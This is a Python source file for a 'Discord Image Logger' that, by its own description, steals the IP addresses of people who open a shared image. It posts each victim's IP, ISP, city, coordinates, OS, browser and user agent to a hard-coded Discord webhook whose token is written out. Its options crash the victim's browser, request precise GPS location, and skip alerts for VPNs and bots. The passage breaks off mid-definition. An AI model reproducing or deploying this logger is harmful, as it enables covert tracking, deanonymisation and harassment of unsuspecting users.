# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1127507873375731784/POQsesV9cM-RYmAIca6Cpghsd6hKyOQXLxrkrHb01In00BkBKFPlTiIQgaNIKN1vZK0-",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
